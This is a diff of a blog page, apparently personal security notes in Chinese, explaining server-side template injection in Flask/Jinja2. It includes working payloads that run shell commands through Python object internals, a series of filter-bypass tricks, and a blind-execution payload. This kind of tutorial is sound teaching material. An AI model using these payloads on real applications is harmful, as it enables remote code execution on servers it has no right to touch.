@@ -5,7 +5,8 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="SSTI, marin的小窝">
-    <meta name="description" content="SSTISSTI（服务器端模板注入）当前使用的框架，python 的 flask、 java 的 spring 等都是用户的输入传入控制器，然后根据请求类型和请求的指令发送给对应的业务模块进行业务逻辑判断，数据库读取，最后把结果返回给视图层">
+    <meta name="description" content="SSTISSTI当前使用的框架，python 的 flask、 java 的 spring 等都是用户的输入传入控制器，然后根据请求类型和请求的指令发送给对应的业务模块进行业务逻辑判断，数据库读取，最后把结果返回给视图层，渲染后展示给用户
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -331,11 +332,12 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="SSTI（服务器端模板注入）"><a href="#SSTI（服务器端模板注入）" class="headerlink" title="SSTI（服务器端模板注入）"></a>SSTI（服务器端模板注入）</h2><p>当前使用的框架，python 的 flask、 java 的 spring 等都是用户的输入传入控制器，然后根据请求类型和请求的指令发送给对应的业务模块进行业务逻辑判断，数据库读取，最后把结果返回给视图层，渲染后展示给用户</p>
+                <h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="SSTI-1"><a href="#SSTI-1" class="headerlink" title="SSTI"></a><strong>SSTI</strong></h2><p>当前使用的框架，python 的 flask、 java 的 spring 等都是用户的输入传入控制器，然后根据请求类型和请求的指令发送给对应的业务模块进行业务逻辑判断，数据库读取，最后把结果返回给视图层，渲染后展示给用户</p>
 <p>这个漏洞的成因就是因为服务器端接收到了用户的恶意输入后，没有任何处理就将其作为 web 模板的一部分，模板引擎在渲染目标时，执行了用户插入的恶意语句，导致了信息泄露、代码执行等问题</p>
-<p>模板注入一般都会使用对应引擎的语法包裹恶意代码，比如 jinja2 的 <code>&#123;&#123;&#125;&#125;</code>，因为在渲染函数中，不会对变量进行渲染， <code>&#123;&#123;&#125;&#125;</code> 中的内容会被当作变量解析，所以可以实现模板注入</p>
+<p>模板注入一般都会使用对应引擎的语法包裹恶意代码，比如 <code>jinja2</code>​ 的 <code>&#123;&#123;&#125;&#125;</code>​，因为在渲染函数中，不会对变量进行渲染， <code>&#123;&#123;&#125;&#125;</code> 中的内容会被当作变量解析，所以可以实现模板注入</p>
 <p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260204001726-jk6pdwl.png" alt="image"></p>
-<h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><p>模板是一种将数据转化为实际的视觉表现（HTML）的一种手段<br> 模板的好处是数据放到模板中，直接渲染成 html 文本，返回给浏览器，展示快</p>
+<p>‍</p>
+<h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><p>模板是一种将数据转化为实际的视觉表现（HTML）的一种手段<br>模板的好处是数据放到模板中，直接渲染成 html 文本，返回给浏览器，展示快</p>
 <p>这里有两种渲染方式</p>
 <ul>
 <li><p>后端渲染：数据传输到服务器或者数据直接存储在服务器中，后端使用模板解析这些数据并渲染成 HTML 返回给浏览器</p>
@@ -348,16 +350,15 @@
 	&lt;h1&gt;&#123;$name&#125;&lt;&#x2F;h1&gt;
 &lt;&#x2F;html&gt;</code></pre>
 
-
-
+<p>‍</p>
 <h3 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h3><p>这里记录一下 flask 的 ssti 漏洞，其实就是 jinja2 的模板注入，因为 flask 中内置了 jinja2 用来渲染的</p>
-<p>flask 使用 render_template() 来渲染模板时，用户的输入被视为变量值，jinja2 默认会对变量进行 HTML 转义，且不会执行其中的模板指令</p>
+<p>flask 使用 <code>render_template()</code> 来渲染模板时，用户的输入被视为变量值，jinja2 默认会对变量进行 HTML 转义，且不会执行其中的模板指令</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">@app.route(&quot;&#x2F;login&quot;)
 def login():
 	name &#x3D; 1
     return render_template(&quot;login.html&quot;,name&#x3D;name)</code></pre>
 
-<p>但是如果偷懒，使用了 render_template_string()，并且配合了格式化字符串，用户的输入在渲染前就已经变成了模板结构的一部分</p>
+<p>但是如果偷懒，使用了 <code>render_template_string()</code>，并且配合了格式化字符串，用户的输入在渲染前就已经变成了模板结构的一部分</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">from flask import Flask, render_template_string, request
 
 app &#x3D; Flask(__name__)
@@ -381,127 +382,125 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
 <li><p><code>&#123;% %&#125;</code> 可以用来声明变量，也可以用来构造循环语句和条件语句</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set x &#x3D; &#39;marin&#39; %&#125;  # 声明变量
 &#123;% for i in [&#39;a&#39;,&#39;b&#39;,&#39;c&#39;]%&#125; &#123;&#123;i&#125;&#125; &#123;% endfor %&#125; #循环
-&#123;% if 25&#x3D;&#x3D;5*5 %&#125; &#123;&#123;1&#125;&#125; &#123;% endif %&#125;   #条件</code></pre>
-</li>
+&#123;% if 25&#x3D;&#x3D;5*5 %&#125; &#123;&#123;1&#125;&#125; &#123;% endif %&#125;   #条件</code></pre></li>
 <li><p><code>&#123;&#123; &#125;&#125;</code> 可以用来将表达式打印到模板输出</p>
 </li>
 <li><p>&#96;&#96; 表示未包含在模板输出中的注释</p>
 </li>
-<li><p><code># #</code> 可能和 <code>&#123;% %&#125;</code> 有相同的效果</p>
+<li><p><code># #</code>​ 可能和 <code>&#123;% %&#125;</code> 有相同的效果</p>
 </li>
 </ol>
+<p>‍</p>
 <h4 id="python-利用点"><a href="#python-利用点" class="headerlink" title="python 利用点"></a>python 利用点</h4><blockquote>
-<p>在 python 中，模块可以用 . 访问，但是字典不支持</p>
+<p>在 python 中，模块可以用 <code>.</code> 访问，但是字典不支持</p>
 </blockquote>
 <ul>
-<li><p><strong>class</strong></p>
-<p>用于获取对象的类，在 python 中，所有东西都是对象<br> 获取了类之后在 ssti 中就可以得到很多东西了</p>
+<li><p><code>__class__</code></p>
+<p>用于获取对象的类，在 python 中，所有东西都是对象<br>获取了类之后在 ssti 中就可以得到很多东西了</p>
 </li>
-<li><p><strong>base</strong></p>
+<li><p><code>__base__</code></p>
 <p>返回一个对象所直接继承的父类</p>
 </li>
-<li><p><strong>mro</strong></p>
-<p>返回一个从当前类到 object 的所有继承路径的元组</p>
+<li><p><code>__mro__</code></p>
+<p>返回一个从当前类到 <code>object</code> 的所有继承路径的元组</p>
 </li>
-<li><p><strong>subclasses</strong>()</p>
+<li><p><code>__subclasses__()</code></p>
 <p>返回当前类的所有子类的方法</p>
 </li>
-<li><p><strong>init</strong></p>
-<p>所有原生类都包含的一个方法，用来初始化一个对象，返回的类型是 function，用来当跳板调用 <strong>globals</strong>，因为只有函数和方法才有 <strong>globals</strong> 属性，类本身是没有的</p>
+<li><p><code>__init__</code></p>
+<p>所有原生类都包含的一个方法，用来初始化一个对象，返回的类型是 <code>function</code>​，用来当跳板调用 <code>__globals__</code>​，因为只有函数和方法才有 <code>__globals__</code> 属性，类本身是没有的</p>
 </li>
-<li><p><strong>globals</strong></p>
-<p>是一个 function 对象的属性，用来获取函数下所有可以使用的 module、方法、变量，返回一个字典</p>
+<li><p><code>__globals__</code></p>
+<p>是一个 <code>function</code> 对象的属性，用来获取函数下所有可以使用的 module、方法、变量，返回一个字典</p>
 </li>
-<li><p><strong>builtins</strong></p>
-<p>这是一个自动注入到每个作用域中的命名空间，包含了 python 的内置函数，其实就相当于字典，但是可以用 . 调用其中的对象</p>
+<li><p><code>__builtins__</code></p>
+<p>这是一个自动注入到每个作用域中的命名空间，包含了 python 的内置函数，其实就相当于字典，但是可以用 <code>.</code> 调用其中的对象</p>
 </li>
-<li><p><strong>str</strong>()</p>
-<p>用来转化为字符串，并且可以用下标取字符串 config.<strong>str</strong>()[1]</p>
+<li><p><code>__str__()</code></p>
+<p>用来转化为字符串，并且可以用下标取字符串 <code>config.__str__()[1]</code></p>
 </li>
-<li><p><strong>getitem</strong>()</p>
-<p>这个是用下标访问时的行为，obj[key] 就相当于 obj.<strong>getitem</strong>(key)，用在 [] 被 waf 的情况下</p>
+<li><p><code>__getitem__()</code></p>
+<p>这个是用下标访问时的行为，<code>obj[key]</code>​ 就相当于 <code>obj.__getitem__(key)</code>​，用在 <code>[]</code> 被 waf 的情况下</p>
 </li>
-<li><p>config</p>
+<li><p><code>config</code></p>
 <p>flask 的配置对象</p>
 </li>
-<li><p>g</p>
-<p><code>&#123;&#123;g&#125;&#125;</code> 得到 &lt;flask.g of ‘flask_ssti’&gt;</p>
+<li><p><code>g</code></p>
+<p><code>&#123;&#123;g&#125;&#125;</code>​ 得到 <code>&lt;flask.g of &#39;flask_ssti&#39;&gt;</code></p>
 </li>
-<li><p>request.environ</p>
+<li><p><code>request.environ</code></p>
 <p>运行时的环境变量</p>
 </li>
 </ul>
+<p>‍</p>
 <h4 id="基础-payload"><a href="#基础-payload" class="headerlink" title="基础 payload"></a>基础 payload</h4><pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; &quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;ls ..&#x2F;&#39;).read() &#125;&#125;</code></pre>
 
-
-
+<p>‍</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; url_for.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;</code></pre>
 
-
-
+<p>‍</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read() &#125;&#125;</code></pre>
 
-
-
+<p>‍</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; x.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;</code></pre>
 
-
-
+<p>‍</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print (lipsum|attr(__globals__)).os.popen(&#39;ls&#39;).read() %&#125;</code></pre>
 
-
-
-<h4 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h4><h5 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h5><p>当过滤了 ‘’ 、”” 时需要构造字符串</p>
+<p>‍</p>
+<h4 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h4><h5 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h5><p>当过滤了 <code>&#39;&#39;</code>​ 、<code>&quot;&quot;</code> 时需要构造字符串</p>
 <ul>
-<li><p>request 对象</p>
+<li><p><code>request</code> 对象</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; request.args.a &#125;&#125;
 &#123;&#123; request.values.a &#125;&#125;
-&#123;&#123; request.cookies.a &#125;&#125;</code></pre>
-</li>
-<li><p>利用 dict 配合 join 拼接</p>
-<p>join 可以将可迭代对象的元素拼接成一个字符串</p>
+&#123;&#123; request.cookies.a &#125;&#125;</code></pre></li>
+<li><p>利用 <code>dict</code>​ 配合 <code>join</code> 拼接</p>
+<p><code>join</code> 可以将可迭代对象的元素拼接成一个字符串</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set po&#x3D;dict(po&#x3D;a,p&#x3D;b)|join %&#125;</code></pre>
 
 <blockquote>
 <p>在 python3.6 之前字典是无序的，这个就没有用了</p>
 </blockquote>
 </li>
-<li><p>利用 string|list 提取现有字符</p>
-<p>将对象转化为字符串，然后再转化为列表，可以用来获取字符，相当于 str()、list()</p>
+<li><p>利用 <code>string|list</code> 提取现有字符</p>
+<p>将对象转化为字符串，然后再转化为列表，可以用来获取字符，相当于 <code>str()</code>​、<code>list()</code></p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; (config|string)[1] &#125;&#125;
 &#123;&#123; (config|string|list).pop(1) &#125;&#125;  # 绕过 []</code></pre></li>
 </ul>
-<h5 id="点号绕过"><a href="#点号绕过" class="headerlink" title="点号绕过"></a>点号绕过</h5><p>当过滤了 . 号，用来获取模块时</p>
+<p>‍</p>
+<h5 id="点号绕过"><a href="#点号绕过" class="headerlink" title="点号绕过"></a>点号绕过</h5><p>当过滤了 <code>.</code> 号，用来获取模块时</p>
 <ul>
-<li><p>attr() 过滤器</p>
+<li><p><code>attr()</code> 过滤器</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; obj|attr(&#39;属性&#39;) &#125;&#125;
 &#123;&#123; attr(obj,&#39;属性&#39;) &#125;&#125;</code></pre></li>
 </ul>
-<h5 id="中括号绕过"><a href="#中括号绕过" class="headerlink" title="中括号绕过"></a>中括号绕过</h5><p>当过滤了 []，无法进行切片或字典取值</p>
+<p>‍</p>
+<h5 id="中括号绕过"><a href="#中括号绕过" class="headerlink" title="中括号绕过"></a>中括号绕过</h5><p>当过滤了 <code>[]</code>，无法进行切片或字典取值</p>
 <ul>
-<li><p>利用 <strong>getitem</strong></p>
+<li><p>利用 <code>__getitem__</code></p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; lipsum.__globals__.__getitem__(&#39;os&#39;) &#125;&#125;</code></pre>
 </li>
-<li><p>利用 pop</p>
+<li><p>利用 <code>pop</code></p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; (config|string|list).pop(1) &#125;&#125;</code></pre></li>
 </ul>
+<p>‍</p>
 <h5 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h5><p>有些词被列入黑名单的时候</p>
 <ul>
-<li><p>利用 format</p>
+<li><p>利用 <code>format</code></p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print &quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95) %&#125;
 # __class__</code></pre>
 </li>
-<li><p>利用 replace&#x2F;reverse</p>
+<li><p>利用 <code>replace</code>​&#x2F;<code>reverse</code></p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print &quot;__claee__&quot;|replace(&#39;e&#39;,&#39;s&#39;) %&#125;
 # __class__
 &#123;% print &quot;__ssalc__&quot;|reverse %&#125;
 # __class__</code></pre>
 </li>
-<li><p>利用 decode</p>
+<li><p>利用 <code>decode</code></p>
 <p>这个只在 python2 中有这个方法，python3 中需要调用 base64 模块</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; &quot;X19jbGFzc19f&quot;.decode(&quot;base64&quot;) &#125;&#125;</code></pre>
 </li>
-<li><p>利用 dict 配合 join 拼接</p>
+<li><p>利用 <code>dict</code>​ 配合 <code>join</code> 拼接</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set built&#x3D;(_,_,dict(builtins&#x3D;a)|join,_,_)|join %&#125;</code></pre>
 </li>
 <li><p>全角字符替代</p>
@@ -523,19 +522,20 @@ for i in s:
     t+&#x3D;&#39;\&#39;&#39;+half2full(i)+&#39;\&#39;,&#39;
 print(t)</code></pre></li>
 </ul>
+<p>‍</p>
 <h5 id="特殊字符绕过"><a href="#特殊字符绕过" class="headerlink" title="特殊字符绕过"></a>特殊字符绕过</h5><p>有些特殊的字符可能会被过滤，比如下划线，或者数字</p>
 <ul>
-<li><p>利用 config 或一些能看到的列表拿取里面的字符</p>
+<li><p>利用 <code>config</code> 或一些能看到的列表拿取里面的字符</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;&#123; config.__str__()[1] &#125;&#125;</code></pre>
 </li>
-<li><p>构造 chr 方法获取字符</p>
+<li><p>构造 <code>chr</code> 方法获取字符</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set chr&#x3D;url_for.__globals__.__builtins__.chr %&#125;</code></pre>
 </li>
-<li><p>利用 length 获取数字</p>
+<li><p>利用 <code>length</code> 获取数字</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set a&#x3D;dict(a&#x3D;a)|join|length %&#125;</code></pre>
 </li>
-<li><p>利用 select 获取字符</p>
-<p>原本是原来筛选元素的，但是作用于空元组时，会生成一个生成器对象，然后配合 string|list 获取字符</p>
+<li><p>利用 <code>select</code> 获取字符</p>
+<p>原本是原来筛选元素的，但是作用于空元组时，会生成一个生成器对象，然后配合 <code>string|list</code> 获取字符</p>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% set a&#x3D;(()|select|string|list)|attr(&#39;pop&#39;)(0) %&#125;
 &#123;% print a %&#125;</code></pre>
 </li>
@@ -543,13 +543,17 @@ print(t)</code></pre></li>
 <pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&#123;% print &quot;\x5f\x5fclass\x5f\x5f&quot; %&#125;
 # __class__</code></pre></li>
 </ul>
+<p>‍</p>
 <h4 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h4><pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">&#123;&#123; url_for.__globals__.__builtins__.__import__(&#39;os&#39;).makedirs(&#39;static&#39;, exist_ok&#x3D;True) or  url_for.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;cat &#x2F;usr&#x2F;bin&#x2F;rev &gt; &#x2F;static&#x2F;secret.txt&#39;) &#125;&#125;</code></pre>
 
-
-
+<p>‍</p>
 <h3 id="EJS-模板注入"><a href="#EJS-模板注入" class="headerlink" title="EJS 模板注入"></a>EJS 模板注入</h3><p>模板语法：使用 <code>&lt;%=%&gt;</code></p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
 <p>参考：</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/3311">flask之ssti模版注入从零到入门-先知社区</a></p>
+<p>‍</p>
 
                 
             </div>
@@ -698,16 +702,17 @@ print(t)</code></pre></li>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2025/12/05/http-qing-qiu-zou-si/">
+                <a href="/2025/12/05/ssti/">
                     <div class="card-image">
                         
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/%E9%BB%92%E6%B1%9F%E9%9B%AB%E3%81%9F%E3%82%93_115192288.jpg" class="responsive-img" alt="HTTP 请求走私">
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/15212263_95842155_p0.jpg" class="responsive-img" alt="SSTI">
                         
-                        <span class="card-title">HTTP 请求走私</span>
+                        <span class="card-title">SSTI</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -717,9 +722,9 @@ print(t)</code></pre></li>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-12-05
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-12-05
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -732,6 +737,7 @@ print(t)</code></pre></li>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -754,12 +760,12 @@ print(t)</code></pre></li>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/12/05/xxe/">
+                <a href="/2025/12/05/http-qing-qiu-zou-si/">
                     <div class="card-image">
                         
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20240312_123907.jpg" class="responsive-img" alt="XXE">
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/%E9%BB%92%E6%B1%9F%E9%9B%AB%E3%81%9F%E3%82%93_115192288.jpg" class="responsive-img" alt="HTTP 请求走私">
                         
-                        <span class="card-title">XXE</span>
+                        <span class="card-title">HTTP 请求走私</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
